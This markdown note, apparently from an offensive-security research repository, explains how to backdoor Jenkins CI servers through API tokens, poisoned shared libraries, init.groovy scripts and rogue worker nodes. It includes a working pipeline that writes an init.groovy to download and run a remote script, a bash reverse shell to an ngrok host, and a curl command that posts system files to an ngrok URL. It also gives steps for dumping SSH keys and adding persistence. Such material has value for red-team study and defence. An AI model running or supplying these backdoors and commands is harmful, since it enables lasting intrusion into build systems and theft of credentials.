# Backdooring

- Backdooring helps attacker to gain access over systems over long period of time ( sometimes bypassing the security checks )
- A higher level privileges might be required to do the changes in configuration



## User issued Jenkins API Tokens

- It is possible for users to generate their own API tokens.
- Can be used to bypass other authentication process ( Form based Authentication / 2FA authentication )
- Usually undected ( unless the usage count is not tracked )
- As an attacker we need to make sure, we need to give right priviliges to these compromised users in case Matrix Authorization Strategy is enabled.

```
curl http://username:token@127.0.0.1:8080
```
<img src="api-token-access.png">

## Using Shared Libraries

- Jenkins shared library is popular where large number of jenkins jobs or pipelines uses a repeated code in pipeline script. 
- The developers creates certain modular functions containing the repetitive code and then reuses across various projects/pipelines/jobs.
- Personal Research : https://oxhat.blogspot.com/2022/07/attacking-backdooring-and-exfiltrating.html
- There are 2 ways we can backdoor the shared pipelines
  1. Add a backdoor inside a shared library codebase ( Jenkins Admin Access Not Required )
``` Groovy
@Library("shared-libraries") _
pipeline{
    agent any
    stages {
        stage("example"){
            steps{
                sh "echo Just a job2"
                helloWorld(name:"User2",dayOfWeek:"Tuesday")
            }
        }
    }
}
```
  - <img src="shared-library-code.png">
  3. Change the shared library location to an attaker controlled shared library ( Jenkins Admin Access Required )
  - <img src="shared-library-conf.png">

## Groovy init scripts

- We can try this technique both from pipeline / after controller's compromise.
- We need to add ```init.groovy``` file with our payload at home directory ( the directory that contains other config files pf Jenkins, sometimes referred as $JENKINS_HOME )
- To trigger this, we would need a restart.
- We have couple of options what we can do with our backdoor scripts
  - Get a reverse shell - We can run this via pipeline
``` Groovy
pipeline{
    agent any
    stages{
        stage('Adding a groovy init file'){
            steps{
                sh '''
                    echo "'wget -O /tmp/revshell.sh  https://gist.githubusercontent.com/dibsy/00d346575659f977b353f95a7064e966/raw/dc89f902db2c81fe96c2f5a102e16c25b8308983/temp-cmd.txt'.execute()" > /var/lib/jenkins/init.groovy
                    echo "sleep(5000)" >> /var/lib/jenkins/init.groovy
                    echo "'sh /tmp/revshell.sh'.execute()" >> /var/lib/jenkins/init.groovy
                    '''
            }
        }
    }
}
```
  
  
  
  
init.groovy
```
"wget -o /tmp/revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
"sh /tmp/revshell.sh".execute()
```
revshell.sh
```
bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
```

<img src="backdoor-rev.png">

  - Exfiltrate data - You can exfiltrate system files and automate a process to exfiltrate all jenkins configuration files, secrets,
exfil.groovy

```
"curl -X POST https://6aee-91-166-172-59.ngrok-free.app -d @/etc/hosts".execute()
```

<img src="backdoor-exfil.png">

  - Use other persistent techniques
    - Add a cronjob
    - Add another user

## Triggering backdoor jobs

- Add a build-step

- Add a post-build Actions to start our backdoor

- Build a job that runs periodically


## Worker-Node SSH Keys

- We can dump the SSH keys from the Jenkins Controller
- Once we have the SSH keys we can montitor the logon events and exfiltrate the build data or snoop on it for debug logs or credentials.

## Addling Malicious Worker-Node 

- In this process we update / add a new configuration with an attacker controller worker node.
- We can update the Worker-Node configuration to point to that node.
- This is possible either adding a new agent or updating the ssh keys used for configuration.

<img src="configure-agent.png">

